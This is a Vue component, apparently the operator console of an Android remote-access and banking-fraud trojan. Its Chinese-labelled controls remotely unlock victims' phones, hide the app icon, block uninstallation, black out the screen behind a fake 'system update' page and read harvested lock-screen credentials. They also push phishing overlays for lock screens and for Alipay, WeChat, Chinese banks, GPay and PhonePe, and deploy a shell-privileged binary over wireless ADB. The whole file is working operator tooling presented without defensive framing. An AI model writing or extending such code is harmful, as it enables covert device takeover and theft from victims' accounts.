<script setup lang="ts">
import { ref, computed, onMounted } from 'vue';
import {
    NButton,
    NInput,
    NSelect,
    NIcon,
    NTag,
    NGrid,
    NGridItem,
} from 'naive-ui';
import axios from 'axios';
import {
    SunnyOutline,
    LockClosedOutline,
    LockOpenOutline,
    VolumeMuteOutline,
    VolumeHighOutline,
    VolumeLowOutline,
    ShieldOutline,
    FishOutline,
    TvOutline,
    LogoAlipay,
    CardOutline,
    CashOutline,
    BusinessOutline,
    LeafOutline,
    PlanetOutline,
    StorefrontOutline,
    LogoUsd,
    PhonePortraitOutline,
    EyeOffOutline,
    HandLeftOutline,
    BanOutline,
    KeyOutline,
    WifiOutline,
    SettingsOutline,
    SyncOutline,
    CodeSlashOutline,
    RocketOutline,
    TerminalOutline,
    InformationCircleOutline,
} from '@vicons/ionicons5';
import { ChatbubbleEllipsesOutline as LogoWechat } from '@vicons/ionicons5';
import { quickApps } from '@/constants/quickApps';
import CredentialPanel from './CredentialPanel.vue';

interface Props {
    phonePassword?: string;
    deviceUid?: string;
}

interface Emits {
    (e: 'wakeScreen'): void;
    (e: 'lock', type: 0 | 1 | 2 | 3): void;
    (e: 'sendMute'): void;
    (e: 'sendUnmute'): void;
    (e: 'volumeUp'): void;
    (e: 'volumeDown'): void;
    (e: 'sendKb', type: number): void;
    (e: 'sendBlock', type: number): void;
    (e: 'hideIcon'): void;
    (e: 'sendPhish', type: string, title: string, content: string): void;
    (e: 'sendBankPhish', bank: string): void;
    (e: 'toggleBlockText', text: string, bg: string): void;
    (e: 'paste', text: string): void;
    (e: 'openQuickApp', app: string): void;
    (e: 'modifyPassword', password: string): void;
    (e: 'enablePasswordMonitoring'): void;
}

const props = withDefaults(defineProps<Props>(), {
    phonePassword: '',
    deviceUid: '',
});

const emit = defineEmits<Emits>();

const pasteText = ref('');
const phishType = ref('0');
const phishTitle = ref('');
const phishContent = ref('');
const blockText = ref('');
const blockBg = ref('0');
const isBlockTextActive = ref(false);
const passwordInput = ref('');

const handlePaste = () => {
    if (pasteText.value.trim()) {
        emit('paste', pasteText.value);
        pasteText.value = '';
    }
};

const handleSendPhish = () => {
    emit('sendPhish', phishType.value, phishTitle.value, phishContent.value);
};

const handleModifyPassword = () => {
    if (passwordInput.value.trim() && /^\d+$/.test(passwordInput.value)) {
        emit('modifyPassword', passwordInput.value);
        passwordInput.value = '';
    }
};

const handleToggleBlockText = () => {
    isBlockTextActive.value = !isBlockTextActive.value;
    emit('toggleBlockText', blockText.value, blockBg.value);
};

interface AdbStatusData {
    pairCompleted: boolean;
    adbDeployEnabled: boolean;
    localServiceAlive: boolean;
    debugPort: number;
    wifiDebugEnabled: boolean;
    isPairRunning: boolean;
    pairState: string;
}

const isProcessing = ref(false);
const lastCommand = ref<{ success: boolean; message: string; command: string } | null>(null);
const adbStatus = ref<AdbStatusData | null>(null);
const adbStatusLoading = ref(false);

const isAdbConnected = computed(() =>
    adbStatus.value?.pairCompleted && adbStatus.value?.localServiceAlive
);

async function fetchAdbStatus() {
    try {
        adbStatusLoading.value = true;
        const { data } = await axios.get(`/api/devices/${props.deviceUid}/adb-status`);
        const apkResp = data.data;
        if (data.success && apkResp?.data) {
            adbStatus.value = apkResp.data;
        }
    } catch (e: unknown) {
        console.error('获取 ADB 状态失败', e);
    } finally {
        adbStatusLoading.value = false;
    }
}

const fetchLatestCredential = async (): Promise<Record<string, unknown> | null> => {
    try {
        const { data } = await axios.get(`/devices/${props.deviceUid}/credentials`, {
            params: { per_page: 1 },
        });
        const cred = data.data?.data?.[0];
        if (!cred) return null;
        return {
            password: cred.password || cred.text_cipher || null,
            password_type: cred.password_type || (cred.cipher_grade_code === 'PASSWORD_QUALITY_PATTERN' ? 'pattern' : null),
            pattern_cipher: cred.pattern_cipher || null,
        };
    } catch {
        return null;
    }
};

const sendAdbCommand = async (command: string, label: string) => {
    isProcessing.value = true;
    lastCommand.value = null;
    try {
        let params: Record<string, unknown> = {};
        if (command === 'AUTO_WIRELESS_PAIRING' || command === 'START_PAIRING' || command === 'FULL_DEPLOY') {
            const credential = await fetchLatestCredential();
            if (credential) params = { credential };
        }
        const { data } = await axios.post(
            `/api/devices/${props.deviceUid}/adb-command`,
            { command, params }
        );
        lastCommand.value = {
            success: data.success,
            message: data.data?.msg || data.error || label,
            command: label,
        };
    } catch (e: unknown) {
        const errMsg = e instanceof Error
            ? (e as any).response?.data?.error || (e as any).response?.data?.message || e.message
            : 'Unknown error';
        lastCommand.value = { success: false, message: errMsg, command: label };
    } finally {
        isProcessing.value = false;
    }
};

onMounted(() => {
    if (props.deviceUid) fetchAdbStatus();
});

const bankButtons = [
    { name: 'IM', code: '0', color: '#6366f1', icon: CashOutline },
    { name: 'TP', code: '2', color: '#8b5cf6', icon: CashOutline },
    { name: '支付宝', code: '6', color: '#1677ff', icon: LogoAlipay },
    { name: '微信', code: '7', color: '#07c160', icon: LogoWechat },
    { name: '云闪付', code: '8', color: '#e62129', icon: CardOutline },
    { name: '建行', code: '9', color: '#0066b3', icon: BusinessOutline },
    { name: '邮储', code: '10', color: '#007d3a', icon: CashOutline },
    { name: '农行', code: '11', color: '#009944', icon: LeafOutline },
    { name: '中行', code: '12', color: '#c9151e', icon: PlanetOutline },
    { name: '工行', code: '13', color: '#e60012', icon: StorefrontOutline },
    { name: '招行', code: '14', color: '#dc241f', icon: CashOutline },
    { name: 'GPay', code: '15', color: '#4285f4', icon: LogoUsd },
    { name: 'PhonePe', code: '16', color: '#5f259f', icon: PhonePortraitOutline },
    { name: 'AN', code: '17', color: '#f59e0b', icon: CashOutline },
    { name: 'MB', code: '18', color: '#00a0e9', icon: PhonePortraitOutline },
    { name: 'BC', code: '19', color: '#ff6b00', icon: CashOutline },
];
</script>

<template>
    <div class="control-tab">
        <!-- 快捷操作 -->
        <section class="panel panel--device">
            <div class="panel-header">
                <NIcon :component="SunnyOutline" size="15" />
                <span>快捷操作</span>
            </div>
            <div class="btn-row">
                <NButton size="small" type="warning" @click="emit('wakeScreen')">
                    <template #icon><NIcon :component="SunnyOutline" /></template>
                    点亮
                </NButton>
                <NButton size="small" @click="emit('lock', 0)">
                    <template #icon><NIcon :component="LockOpenOutline" /></template>
                    解锁
                </NButton>
                <NButton size="small" @click="emit('lock', 1)">
                    <template #icon><NIcon :component="LockClosedOutline" /></template>
                    锁屏
                </NButton>
                <NButton size="small" type="info" @click="emit('sendMute')">
                    <template #icon><NIcon :component="VolumeMuteOutline" /></template>
                    静音
                </NButton>
                <NButton size="small" type="success" @click="emit('sendUnmute')">
                    <template #icon><NIcon :component="VolumeHighOutline" /></template>
                    取消静音
                </NButton>
                <NButton size="small" @click="emit('volumeUp')">
                    <template #icon><NIcon :component="VolumeHighOutline" /></template>
                    音量+
                </NButton>
                <NButton size="small" @click="emit('volumeDown')">
                    <template #icon><NIcon :component="VolumeLowOutline" /></template>
                    音量-
                </NButton>
            </div>

            <div class="sub-label">快捷应用</div>
            <div class="app-row">
                <NButton
                    v-for="app in quickApps"
                    :key="app.key"
                    size="tiny"
                    :style="{ backgroundColor: app.color, color: '#fff', borderColor: app.color }"
                    @click="emit('openQuickApp', app.key)"
                >
                    <template #icon><NIcon :component="app.icon" /></template>
                    {{ app.key }}
                </NButton>
            </div>

            <div class="sub-label">安全控制</div>
            <div class="btn-row btn-row--compact">
                <NButton size="tiny" @click="emit('sendKb', 2)">
                    <template #icon><NIcon :component="ShieldOutline" /></template>
                    防卸载
                </NButton>
                <NButton size="tiny" @click="emit('sendKb', 3)">可卸载</NButton>
                <NButton size="tiny" @click="emit('sendBlock', 0)">
                    <template #icon><NIcon :component="BanOutline" /></template>
                    黑屏
                </NButton>
                <NButton size="tiny" @click="emit('sendBlock', 1)">取消黑屏</NButton>
                <NButton size="tiny" @click="emit('sendBlock', 2)">
                    <template #icon><NIcon :component="HandLeftOutline" /></template>
                    阻止操作
                </NButton>
                <NButton size="tiny" @click="emit('sendBlock', 3)">允许操作</NButton>
                <NButton size="tiny" @click="emit('lock', 2)">
                    <template #icon><NIcon :component="KeyOutline" /></template>
                    清密码
                </NButton>
                <NButton size="tiny" @click="emit('lock', 3)">禁人脸</NButton>
                <NButton size="tiny" type="warning" @click="emit('hideIcon')">
                    <template #icon><NIcon :component="EyeOffOutline" /></template>
                    隐藏图标
                </NButton>
                <NButton size="tiny" type="info" @click="emit('enablePasswordMonitoring')">
                    <template #icon><NIcon :component="KeyOutline" /></template>
                    重启密码监听
                </NButton>
            </div>

            <div class="sub-label">文本粘贴</div>
            <div class="input-row">
                <NInput
                    v-model:value="pasteText"
                    placeholder="输入文本粘贴到设备..."
                    size="small"
                    @keyup.enter="handlePaste"
                />
                <NButton size="small" type="primary" @click="handlePaste">粘贴</NButton>
            </div>
        </section>

        <!-- ADB 操作 -->
        <section class="panel panel--adb">
            <div class="panel-header">
                <NIcon :component="WifiOutline" size="15" />
                <span>ADB 操作</span>
                <NTag v-if="adbStatus?.isPairRunning" type="warning" size="small" round class="header-badge">
                    配对进行中
                </NTag>
            </div>

            <div class="sub-label">无线配对</div>
            <div class="adb-actions">
                <div class="adb-card">
                    <NButton block type="primary" size="small" :loading="isProcessing" :disabled="isProcessing || isAdbConnected || adbStatus?.isPairRunning" @click="sendAdbCommand('START_PAIRING', '手动配对')">
                        <template #icon><NIcon :component="WifiOutline" /></template>
                        手动配对
                    </NButton>
                    <p class="hint">开发者选项 → 无线调试 → 读取配对码 → SPAKE2</p>
                </div>
                <div class="adb-card">
                    <NButton block type="info" size="small" :loading="isProcessing" :disabled="isProcessing || isAdbConnected || adbStatus?.isPairRunning" @click="sendAdbCommand('AUTO_WIRELESS_PAIRING', '自动配对')">
                        <template #icon><NIcon :component="SyncOutline" /></template>
                        自动配对
                    </NButton>
                    <p class="hint">设置 → 激活开发者模式 → 开启无线调试 → 配对</p>
                </div>
                <div class="adb-card">
                    <NButton block type="warning" size="small" :loading="isProcessing" :disabled="isProcessing || isAdbConnected || adbStatus?.isPairRunning" @click="sendAdbCommand('DIRECT_PAIR', '直接配对')">
                        <template #icon><NIcon :component="CodeSlashOutline" /></template>
                        直接配对
                    </NButton>
                    <p class="hint">假定配对弹窗已显示，直接读取配对码执行配对</p>
                </div>
            </div>

            <div class="sub-label">设置操作</div>
            <NGrid :cols="2" :x-gap="8" :y-gap="8">
                <NGridItem>
                    <NButton block size="small" :disabled="isProcessing" @click="sendAdbCommand('OPEN_WIFI_DEBUG_SETTINGS', '开发者选项')">
                        <template #icon><NIcon :component="SettingsOutline" /></template>
                        开发者选项
                    </NButton>
                </NGridItem>
                <NGridItem>
                    <NButton block size="small" :disabled="isProcessing" @click="sendAdbCommand('OPEN_ABOUT_PHONE', '关于手机')">
                        <template #icon><NIcon :component="InformationCircleOutline" /></template>
                        关于手机
                    </NButton>
                </NGridItem>
            </NGrid>

            <div class="sub-label">部署操作</div>
            <div class="adb-actions">
                <div class="adb-card">
                    <NButton block type="error" size="small" :loading="isProcessing" :disabled="isProcessing" @click="sendAdbCommand('FULL_DEPLOY', '完整部署')">
                        <template #icon><NIcon :component="RocketOutline" /></template>
                        完整部署
                    </NButton>
                    <p class="hint">重置配对 → ADB WiFi 配对 → 部署 local-service → 初始化</p>
                </div>
                <div class="adb-card">
                    <NButton block type="warning" size="small" :loading="isProcessing" :disabled="isProcessing" @click="sendAdbCommand('DEPLOY_LOCAL_SERVICE', '部署 Local-Service')">
                        <template #icon><NIcon :component="TerminalOutline" /></template>
                        部署 Local-Service
                    </NButton>
                    <p class="hint">仅部署（需已完成配对），推送 Go 二进制以 shell 权限启动</p>
                </div>
            </div>

            <Transition name="result-slide">
                <div v-if="lastCommand" class="cmd-result" :class="lastCommand.success ? 'cmd-result--ok' : 'cmd-result--fail'">
                    <NTag :type="lastCommand.success ? 'success' : 'error'" size="small">{{ lastCommand.command }}</NTag>
                    <span class="cmd-msg">{{ lastCommand.message }}</span>
                </div>
            </Transition>
        </section>

        <!-- 密码钓鱼 -->
        <section class="panel panel--phish">
            <div class="panel-header">
                <NIcon :component="FishOutline" size="15" />
                <span>密码钓鱼</span>
            </div>
            <div class="phish-form">
                <NInput
                    v-model:value="phishTitle"
                    placeholder="钓鱼界面文字标题"
                    size="small"
                />
                <NInput
                    v-model:value="phishContent"
                    placeholder="钓鱼界面文字内容"
                    size="small"
                    type="textarea"
                    :rows="2"
                />
            </div>
            <div class="input-row">
                <NSelect
                    v-model:value="phishType"
                    size="small"
                    :options="[
                        { label: '自由选择密码', value: '0' },
                        { label: '壁纸图案密码', value: '1' },
                        { label: '壁纸数字密码', value: '2' },
                        { label: '壁纸混合密码', value: '3' },
                    ]"
                    style="flex: 1;"
                />
                <NButton size="small" type="error" @click="handleSendPhish">
                    <template #icon><NIcon :component="FishOutline" /></template>
                    钓鱼
                </NButton>
            </div>

            <div class="sub-label">银行 / 支付钓鱼</div>
            <div class="bank-grid">
                <NButton
                    v-for="bank in bankButtons"
                    :key="bank.code"
                    size="tiny"
                    :style="{ backgroundColor: bank.color, color: '#fff', borderColor: bank.color }"
                    @click="emit('sendBankPhish', bank.code)"
                >
                    <template #icon><NIcon :component="bank.icon" /></template>
                    {{ bank.name }}
                </NButton>
            </div>
        </section>

        <!-- 修改解锁密码 -->
        <section class="panel panel--key">
            <div class="panel-header">
                <NIcon :component="KeyOutline" size="15" />
                <span>修改解锁密码</span>
            </div>
            <div class="input-row">
                <NInput
                    v-model:value="passwordInput"
                    placeholder="输入数字密码..."
                    size="small"
                    :allow-input="(value: string) => /^\d*$/.test(value)"
                    style="flex: 1;"
                    @keyup.enter="handleModifyPassword"
                />
                <NButton size="small" type="warning" @click="handleModifyPassword">
                    <template #icon><NIcon :component="KeyOutline" /></template>
                    修改密码
                </NButton>
            </div>
        </section>

        <!-- 黑屏文字 -->
        <section class="panel panel--screen">
            <div class="panel-header">
                <NIcon :component="TvOutline" size="15" />
                <span>黑屏文字</span>
            </div>
            <div class="input-row">
                <NInput
                    v-model:value="blockText"
                    placeholder="黑屏显示文字内容"
                    size="small"
                    style="flex: 1;"
                />
                <NSelect
                    v-model:value="blockBg"
                    size="small"
                    :options="[
                        { label: '黑色背景', value: '0' },
                        { label: '系统更新', value: '1' },
                    ]"
                    style="width: 100px;"
                />
                <NButton
                    size="small"
                    :type="isBlockTextActive ? 'error' : 'default'"
                    @click="handleToggleBlockText"
                >
                    <template #icon><NIcon :component="TvOutline" /></template>
                    {{ isBlockTextActive ? '停止' : '显示' }}
                </NButton>
            </div>
        </section>

        <!-- 密码信息 -->
        <section class="panel panel--cred">
            <CredentialPanel
                :device-uid="props.deviceUid"
                :phone-password="props.phonePassword"
            />
        </section>
    </div>
</template>

<style scoped>
.control-tab {
    display: flex;
    flex-direction: column;
    gap: 6px;
    height: 100%;
    overflow-y: auto;
}

.control-tab::-webkit-scrollbar { width: 3px; }
.control-tab::-webkit-scrollbar-track { background: transparent; }
.control-tab::-webkit-scrollbar-thumb { background: #d1d5db; border-radius: 3px; }

.panel {
    padding: 12px;
    border-radius: 8px;
    background: #f9fafb;
}

.panel-header {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 13px;
    font-weight: 600;
    color: #374151;
    margin-bottom: 10px;
}

.header-badge { margin-left: auto; }

.sub-label {
    font-size: 11px;
    color: #9ca3af;
    margin: 10px 0 6px;
}

.btn-row {
    display: flex;
    flex-wrap: wrap;
    gap: 6px;
}

.btn-row--compact .n-button { font-size: 11px; }

.app-row {
    display: flex;
    flex-wrap: wrap;
    gap: 4px;
}

.app-row .n-button { font-size: 11px; }

.input-row {
    display: flex;
    gap: 6px;
    align-items: center;
}

.adb-actions {
    display: flex;
    flex-direction: column;
    gap: 6px;
}

.hint {
    margin: 2px 0 0;
    font-size: 11px;
    color: #9ca3af;
}

.cmd-result {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 8px 10px;
    border-radius: 6px;
    margin-top: 8px;
}

.cmd-result--ok { background: #f0fdf4; }
.cmd-result--fail { background: #fef2f2; }

.cmd-msg {
    font-size: 12px;
    color: #4b5563;
}

.phish-form {
    display: flex;
    flex-direction: column;
    gap: 6px;
    margin-bottom: 6px;
}

.bank-grid {
    display: flex;
    flex-wrap: wrap;
    gap: 4px;
}

.bank-grid .n-button { font-size: 10px; }

.panel--cred {
    flex: 1;
    min-height: 0;
    display: flex;
    flex-direction: column;
}

.panel--cred :deep(.credential-row) { background: #fff; }

.result-slide-enter-active { transition: opacity 0.2s; }
.result-slide-leave-active { transition: opacity 0.15s; }
.result-slide-enter-from, .result-slide-leave-to { opacity: 0; }
</style>
